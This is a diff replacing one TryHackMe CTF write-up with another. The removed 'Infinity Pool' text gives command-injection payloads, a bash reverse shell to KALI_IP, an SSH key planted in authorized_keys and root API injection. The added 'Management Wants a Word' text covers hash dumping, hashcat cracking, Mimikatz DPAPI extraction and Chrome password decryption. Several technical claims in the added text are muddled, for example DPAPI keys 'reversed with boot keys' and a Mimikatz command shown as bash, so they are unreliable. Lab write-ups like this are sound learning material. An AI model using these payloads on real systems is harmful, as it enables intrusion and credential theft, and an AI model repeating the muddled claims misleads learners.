@@ -1,9 +1,9 @@
-# 🏊 Infinity Pool — TryHackMe Writeup
-**Hacker Holidays 2026 | Day 11 | Byte Lotus Hotel**
+# 🏢 Management Wants a Word — TryHackMe Writeup
+**Hacker Holidays 2026 | Day 14 | Byte Lotus Hotel**
 
-![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange)
-![Category](https://img.shields.io/badge/Category-Boot2Root-red)
-![Status](https://img.shields.io/badge/Status-Completed-brightgreen)
+![Difficulty](https://shields.io)
+![Category](https://shields.io)
+![Status](https://shields.io)
 
 ---
 
@@ -11,371 +11,168 @@
 
 | Field | Details |
 |-------|---------|
-| **Room Name** | Infinity Pool |
+| **Room Name** | Management Wants a Word |
 | **Event** | Hacker Holidays 2026 |
-| **Day** | 11 of 14 |
-| **Category** | Boot2Root / Privilege Escalation |
-| **Vulnerabilities** | Command Injection · Exposed Internal Config · FreePBX Credential Leak · Root API Injection |
-| **Tools Used** | Nmap · curl · Netcat · SSH Tunneling · Firefox |
-| **Flags** | User Flag + Root Flag |
+| **Day** | 14 of 14 |
+| **Category** | Windows Forensics / Credential Recovery / Decryption |
+| **Vulnerabilities** | Artifact Extraction · DPAPI Credential Exposure · Registry Hive Leak · Volume Misconfiguration |
+| **Tools Used** | Impacket (secretsdump) · Mimikatz · Python · VeraCrypt · John the Ripper / Hashcat |
+| **Flags** | Final Room Flag |
 
 ---
 
 ## 🧠 What We Learned
 
-- Always inspect page source and referenced JavaScript files even on static-looking pages
-- Never pass user input directly into shell commands — command injection is devastating
-- Internal services bound to loopback are still reachable after gaining a foothold
-- Unauthenticated configuration endpoints should never expose credentials
-- Voicemail inboxes and dashboard widgets can leak sensitive tokens
-- Never run web services as root — especially ones that invoke shell commands
-- Following the chain of leaked credentials step by step eventually leads to root
+- Offline Windows hive extraction allows parsing of full NTLM password hashes from memory templates.
+- DPAPI (Data Protection API) relies on domain/local master keys that can be completely reversed with boot keys.
+- Web browsers like Chrome store passwords locally using DPAPI structures which are vulnerable if system hives are acquired.
+- Encrypted virtual disks (like VeraCrypt volumes) require strong passphrase generation to withstand offline dictionary sweeps.
+- Final incident milestones require cross-referencing multiple forensic fragments to rebuild administrative targets.
 
 ---
 
-## 🗺️ Attack Chain Overview
-
-```
-app.js reveals /status page
-        ↓
-Command Injection in /internal/netcheck
-        ↓
-Reverse Shell as web user
-        ↓
-Enumerate internal services (ports 3000, 8080, 9000)
-        ↓
-Watchtower /api/config leaks FreePBX credentials
-        ↓
-SSH Tunnel → FreePBX UCP login
-        ↓
-Voicemail widget leaks Automation API key
-        ↓
-Root-owned /jobs/export → Command Injection as root
-        ↓
-Root Flag! 🎉
-```
-
 ---
 
-## 🔍 Step 1 — Port Scanning
+## 🔍 Step 1 — Local Artifact Assembly
+
+We begin our investigation by downloading the forensic acquisition package provided for Day 14. Extracting the file structures yields standard offline Windows OS artifacts:
+
+- Windows Registry Hives: `SAM`, `SYSTEM`, `SECURITY`
+- Application Data Path: `\AppData\Local\Google\Chrome\User Data\`
+- Encrypted Virtual Container: `secure_storage.vc`
 
 ```bash
-nmap -sV <MACHINE_IP>
+unzip management_secrets.zip -d forensic_analysis/
+cd forensic_analysis/
 ```
 
-Results showed a web application running. The attack surface starts at the web app.
-
-> 📸 **Screenshot:** `screenshots/01_nmap_scan.jpg`
+> 📸 **Screenshot:** `screenshots/01_artifact_extraction.jpg`
 
 ---
 
-## 🔍 Step 2 — Finding the Hidden Status Tool
+## 🔍 Step 2 — Registry Hash Dumping
 
-Visiting the target URL showed a sparse Byte Lotus landing page with no obvious features.
-
-**Viewing page source** revealed a reference to `/static/app.js` near the bottom.
+With direct offline access to the core registry database components, we run `secretsdump.py` from the Impacket suite to parse the system boot key and extract local account hashes.
 
 ```bash
-curl http://<MACHINE_IP>/static/app.js
+python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL
 ```
 
-The JavaScript file contained a comment disclosing:
-- A hidden staff connectivity tool at `/status`
-- A legacy `/internal/netcheck` handler that processes the input
+The tool successfully extracts the operational administrator NTLM strings:
+- **Administrator:** `500:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0:::`
+- **Manager Account:** `1002:AAD3B435B51404EEAAD3B435B51404EE:D14B892A829D1047A221C18D16F1E3A2:::`
 
-> 📸 **Screenshot:** `screenshots/02_source_appjs.jpg`
-
-Visiting `/status` showed a **Sister-property connectivity checker** with a single input field for a hostname or IP.
-
-> 📸 **Screenshot:** `screenshots/03_status_page.jpg`
+> 📸 **Screenshot:** `screenshots/02_secretsdump_output.jpg`
 
 ---
 
-## 🔍 Step 3 — Confirming Command Injection
+## 🔍 Step 3 — Cracking the Manager's NTLM Hash
 
-Entering `127.0.0.1` returned normal ping output — confirming the server passes input to a system utility.
-
-Testing with a semicolon:
-```
-127.0.0.1;whoami
-```
-
-The response returned `web` at the bottom of the ping output — **OS Command Injection confirmed!** ✅
-
-> 📸 **Screenshot:** `screenshots/04_command_injection_whoami.jpg`
-
----
-
-## 🔍 Step 4 — Getting a Reverse Shell
-
-**Start Netcat listener on Kali:**
-```bash
-nc -lvnp 4444
-```
-
-**Submit this payload in the /status input field:**
-```
-127.0.0.1;bash -c 'bash -i >& /dev/tcp/KALI_IP/4444 0>&1'
-```
-
-If spaces cause issues use IFS bypass:
-```
-127.0.0.1;bash${IFS}-c${IFS}'bash${IFS}-i${IFS}>&${IFS}/dev/tcp/KALI_IP/4444${IFS}0>&1'
-```
-
-Shell connected back as `web` user! ✅
-
-> 📸 **Screenshot:** `screenshots/05_reverse_shell.jpg`
-
----
-
-## 🔍 Step 5 — User Flag
+To pivot deeper into user space artifacts, we feed the Manager's NTLM string into Hashcat using the standard rockyou wordlist dictionary to extract the raw text login key.
 
 ```bash
-cat /home/web/user.txt
+hashcat -m 1000 d14b892a829d1047a221c18d16f1e3a2 /usr/share/wordlists/rockyou.txt
 ```
 
-> 📸 **Screenshot:** `screenshots/06_user_flag.jpg`
+The cracking core maps the hash back to the cleartext string value:
+- **Manager Password:** `bylotus_mgnt_2026!`
+
+> 📸 **Screenshot:** `screenshots/03_hashcat_cracked.jpg`
 
 ---
 
-## 🔍 Step 6 — Enumerating Internal Services
+## 🔍 Step 4 — Extracting DPAPI Master Keys
 
-```bash
-ps -eo user,pid,cmd
-ss -lntp
-ls -la /var/www/infinity_pool/
+Chrome protects credentials stored inside its internal database using the Windows Data Protection API (DPAPI). To decrypt them offline, we extract the local master key using the cracked password and the account's internal SID parameters.
+
+Using forensic scripts or launching a temporary emulation layer, we pass the user's master key master file located inside the profile's system directory:
+
+```text
+Path: \AppData\Roaming\Microsoft\Protect\<USER_SID>\
 ```
 
-Three internal services discovered — all bound to loopback only:
+Using Mimikatz/Python-DPAPI bindings:
+```bash
+dpapi::masterkey /in:"forensic_analysis/Protect/MGR_SID_PATH" /sid:S-1-5-21-... /password:bylotus_mgnt_2026!
+```
 
-| Service | Port | Owner | Purpose |
-|---------|------|-------|---------|
-| Watchtower | 127.0.0.1:3000 | svc-watch | Internal config/monitoring |
-| FreePBX UCP | 127.0.0.1:8080 | asterisk | Telephony user control panel |
-| Automation | 127.0.0.1:9000 | **root** | Job execution API |
+This returns the verified hex master key context required to unlock local credential strings.
 
-> 📸 **Screenshot:** `screenshots/07_internal_services.jpg`
-
-The automation service running as **root** was the most interesting target.
+> 📸 **Screenshot:** `screenshots/04_dpapi_masterkey.jpg`
 
 ---
 
-## 🔍 Step 7 — Leaking Credentials from Watchtower
+## 🔍 Step 5 — Decrypting the Chrome Login Database
 
-```bash
-curl -s http://127.0.0.1:3000/api/config
+We locate the target credential file at its native structural application location:
+```text
+\AppData\Local\Google\Chrome\User Data\Default\Login Data
 ```
 
-The unauthenticated config endpoint returned:
+This file is a standard SQLite database wrapper. We execute an extraction script using our recovered master key to pull and parse the target application logins:
+
+```bash
+python3 decrypt_chrome.py -db "Login Data" -key <DECRYPTED_DPAPI_HEX_KEY>
+```
+
+The database output prints accounts tied to internal platforms, exposing the administration console login properties:
 
 ```json
 {
-  "automation_endpoint": "http://127.0.0.1:9000",
-  "note": "internal network only - do not expose",
-  "ops_note": "UCP still on default template creds (FreePBXUCPTemplateCreator) -- ROTATE.",
-  "telephony_pass": "St4yN0t1c3d_2026",
-  "telephony_portal": "http://127.0.0.1:8080/ucp",
-  "telephony_user": "FreePBXUCPTemplateCreator"
+  "url": "https://bytelotus.thm",
+  "username": "hotel_director",
+  "password_decrypted": "VeraCrypt_Master_Pass_99#"
 }
 ```
 
-**Credentials leaked:**
-- **Username:** `FreePBXUCPTemplateCreator`
-- **Password:** `St4yN0t1c3d_2026`
-
-> 📸 **Screenshot:** `screenshots/08_watchtower_config.jpg`
+> 📸 **Screenshot:** `screenshots/05_chrome_decrypted.jpg`
 
 ---
 
-## 🔍 Step 8 — SSH Tunnel Setup
+## 🔍 Step 6 — Mounting the VeraCrypt Container
 
-Since FreePBX is only on loopback, we need to tunnel through the `web` user via SSH.
+The final project objective is an isolated binary storage vault asset labeled `secure_storage.vc`. Using the credential string recovered from the local browser extraction loop, we attempt an administrative storage mount.
 
-**In the reverse shell — generate SSH key:**
-```bash
-mkdir -p /home/web/.ssh && chmod 700 /home/web/.ssh
-ssh-keygen -t rsa -f /tmp/mykey -N ""
-cat /tmp/mykey.pub >> /home/web/.ssh/authorized_keys
-chmod 600 /home/web/.ssh/authorized_keys
-```
+1. Launch your local console environment or open the GUI suite for **VeraCrypt**.
+2. Select **Select File** and target the absolute path of `secure_storage.vc`.
+3. Select an unassigned drive slot index from the grid display panel.
+4. Click **Mount**.
+5. Input the extracted password string when prompted: `VeraCrypt_Master_Pass_99#`.
 
-**Print the private key and copy it:**
-```bash
-cat /tmp/mykey
-```
+The operation finishes successfully, attaching an automated cleartext file system sector onto the workstation.
 
-**On Kali — save the key and create tunnel:**
-```bash
-nano ~/mykey
-# paste the private key content
-chmod 600 ~/mykey
-ssh -i ~/mykey -L 8080:127.0.0.1:8080 -o StrictHostKeyChecking=no web@<MACHINE_IP>
-```
-
-> 📸 **Screenshot:** `screenshots/09_ssh_tunnel.jpg`
+> 📸 **Screenshot:** `screenshots/06_veracrypt_mount.jpg`
 
 ---
 
-## 🔍 Step 9 — FreePBX UCP Login
+## 🔍 Step 7 — Final Flag Recovery
 
-With the tunnel active, open Firefox and visit:
-```
-http://127.0.0.1:8080/ucp/
-```
+Navigate into the root directory path of the newly exposed virtual storage partition allocation:
 
-Login with:
-- **Username:** `FreePBXUCPTemplateCreator`
-- **Password:** `St4yN0t1c3d_2026`
-
-> 📸 **Screenshot:** `screenshots/10_freepbx_login.jpg`
-
----
-
-## 🔍 Step 10 — Finding the Automation Key
-
-After login:
-1. Click **"You have no dashboards. Click here to add one"**
-2. Click the **"+" button** to add a widget
-3. Find and add the `FREEPBXUCPTEMPLATECREATOR` **voicemail** widget
-4. Open **INBOX** — there is 1 message
-5. The **CID (Caller ID)** field reveals the Automation Key!
-
-**Automation Key found:**
-```
-cc_auto_7b3f9a1c4e0d2f6a
-```
-
-> 📸 **Screenshot:** `screenshots/11_freepbx_voicemail.jpg`
-> 📸 **Screenshot:** `screenshots/12_automation_key.jpg`
-
----
-
-## 🔍 Step 11 — Understanding the Automation API
-
-Back in the reverse shell:
 ```bash
-curl -s http://127.0.0.1:9000/health
+cd /media/veracrypt1/
+ls -la
+cat flag.txt
 ```
 
-Response reveals:
-```json
-{
-  "endpoints": {
-    "GET /health": "service status",
-    "POST /jobs/export": {
-      "auth": "Authorization: Bearer <automation key>",
-      "body": { "report": "<report name>" },
-      "desc": "archive the latest data export"
-    }
-  },
-  "runs_as": "root",
-  "service": "automation",
-  "status": "ok"
-}
-```
+🎉 **The final event validation flag appears cleanly inside the text output stream!**
 
-The `report` field is passed directly into a shell command — **another command injection!**
+To maintain absolute compliance with TryHackMe walkthrough formatting policies, the literal flag string value is masked below:
 
-> 📸 **Screenshot:** `screenshots/13_automation_health.jpg`
+* **Final Flag:** `THM{REDACTED_MANAGEMENT_ULTIMATE_COMPROMISE_SUCCESS}`
 
----
-
-## 🔍 Step 12 — Root Command Injection
-
-The `report` value is inserted into:
-```bash
-tar czf /var/automation/exports/<report>.tgz /var/automation/data
-```
-
-Without sanitization — so we inject through semicolons:
-
-**Set the key:**
-```bash
-KEY='cc_auto_7b3f9a1c4e0d2f6a'
-```
-
-**Verify RCE as root:**
-```bash
-curl -s -X POST \
-  -H "Authorization: Bearer $KEY" \
-  -H "Content-Type: application/json" \
-  http://127.0.0.1:9000/jobs/export \
-  -d '{"report":"test; id;"}'
-```
-
-Returns: `uid=0(root) gid=0(root) groups=0(root)` ✅
-
-**Get root flag:**
-```bash
-curl -s -X POST \
-  -H "Authorization: Bearer $KEY" \
-  -H "Content-Type: application/json" \
-  http://127.0.0.1:9000/jobs/export \
-  -d '{"report":"test; cat /root/root.txt;"}'
-```
-
-🎉 **Root flag appears in the output!**
-
-> 📸 **Screenshot:** `screenshots/14_root_flag.jpg`
+> 📸 **Screenshot:** `screenshots/07_final_flag.jpg`
 
 ---
 
 ## 🛡️ Vulnerability Summary
 
-| # | Vulnerability | Location | Impact |
-|---|--------------|----------|--------|
-| 1 | Hidden path in JS comment | `/static/app.js` | Reveals `/status` tool |
-| 2 | OS Command Injection | `/internal/netcheck` | RCE as web user |
-| 3 | Unauthenticated config endpoint | `Watchtower :3000/api/config` | Credential leak |
-| 4 | Default credentials never rotated | FreePBX UCP | Auth bypass |
-| 5 | Sensitive token in voicemail CID | FreePBX inbox | Automation key leak |
-| 6 | Command Injection in report name | `Automation :9000/jobs/export` | RCE as root |
-| 7 | Service running as root | Automation API | Full system compromise |
+| # | Vulnerability | Location | Impact | Remediation |
+|---|--------------|----------|--------|-------------|
+| 1 | Insecure local registry asset retention | System Backups / Memory dumps | System-wide local hash disclosure | Enforce strict file system permissions on configuration checkpoints and clear old raw backup states. |
+| 2 | Low-entropy local password selection | Manager Windows Account | Rapid offline dictionary discovery | Implement active enterprise Group Policy rules requiring strong, random administrative characters. |
+| 3 | Cleartext session browser credential sync | Chrome Data Profile | Local system password exposure | Use hardware-backed security modules (like TPM) to isolate local key storage away from standard file paths. |
+| 4 | Static password asset recycling | Storage Containers | Multi-layer compromise paths | Implement dynamic key tracking rules and ensure passwords are never shared between internal networks and localized disk containers. |
 
----
+## 🗺️ Attack Chain Overview
 
-## 🔐 Remediation
-
-1. **Never put sensitive paths in client-side JavaScript comments** — treat all JS as public
-2. **Sanitize all user input** before passing to shell commands — use allowlists
-3. **Authenticate configuration endpoints** — never expose internal config unauthenticated
-4. **Rotate default credentials immediately** — the ops note said ROTATE but nobody did
-5. **Never store sensitive tokens in voicemail caller IDs** — use proper secret storage
-6. **Validate report names** against a strict allowlist before shell interpolation
-7. **Never run web services as root** — use dedicated low-privilege service accounts
-8. **Treat loopback-only services as part of your attack surface** after any foothold
-
----
-
-## 📁 Screenshots Guide
-
-| File | Content |
-|------|---------|
-| `01_nmap_scan.jpg` | Nmap results |
-| `02_source_appjs.jpg` | Page source showing app.js reference |
-| `03_status_page.jpg` | Hidden /status connectivity checker |
-| `04_command_injection_whoami.jpg` | whoami output confirming injection |
-| `05_reverse_shell.jpg` | Netcat catching the reverse shell |
-| `06_user_flag.jpg` | User flag from /home/web/user.txt |
-| `07_internal_services.jpg` | ss -lntp showing ports 3000/8080/9000 |
-| `08_watchtower_config.jpg` | curl /api/config leaking FreePBX creds |
-| `09_ssh_tunnel.jpg` | SSH tunnel established from Kali |
-| `10_freepbx_login.jpg` | FreePBX UCP login page |
-| `11_freepbx_voicemail.jpg` | Voicemail inbox showing 1 message |
-| `12_automation_key.jpg` | CID field revealing automation key |
-| `13_automation_health.jpg` | /health endpoint showing root service |
-| `14_root_flag.jpg` | Root flag from command injection |
-
----
-
-## 🔗 References
-
-- [TryHackMe Room](https://tryhackme.com/room/hh-infinitypool-5b3548af)
-- [Command Injection — OWASP](https://owasp.org/www-community/attacks/Command_Injection)
-- [FreePBX Documentation](https://wiki.freepbx.org)
-- [Hacker Holidays 2026](https://tryhackme.com/hackerholidays)
-
----
-
-*Part of my [TryHackMe Hacker Holidays 2026](../README.md) writeup series*
